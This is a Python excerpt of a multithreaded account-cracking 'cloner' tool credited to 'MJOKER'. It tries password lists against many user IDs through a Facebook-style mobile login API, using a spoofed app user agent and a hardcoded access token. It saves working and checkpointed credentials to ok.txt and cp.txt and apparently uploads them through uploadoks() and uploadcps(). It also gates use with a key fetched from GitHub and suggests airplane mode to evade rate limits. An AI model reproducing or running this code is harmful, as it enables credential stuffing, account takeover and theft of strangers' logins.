...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/MJOKER707/afghan12/main/afghan22.txt').text
			if basesplit in plr:
				key = basesplit
...
┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR  
         MJOKER\033[1;32m[MJOKER]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37m |MJOKER\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  93707266012        │
\033[1;36m│ [✓] MJOKER : \x1b[1;32mPRO PRONOY\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [MJOKER] [pÏඋඋħÏ]\x1b[0m    
 """)
		print("%s [%s•%s] %sTOOL NAME : %sMJOKER❌ PROO CLONER❌"%(G,R,G,B,G))
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK MJOKER-> ok.txt"%(G))
				print("%s [+] CP MJOKER-> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
	...
	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.MJOKER.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
		...
		sys.stdout.write(
			"\r\r %s[>_] [MJOKER] : %s/%s -> \033[0;92m [ MJOKER-OK:%s ]- \033[0;91m[MJOKER-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			response = ses.get("https://b-api.MJOKER.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.MJOKER.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[MJOKER-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [MJOKER-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.MJOKER.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[MJOKER-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MJOKER-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
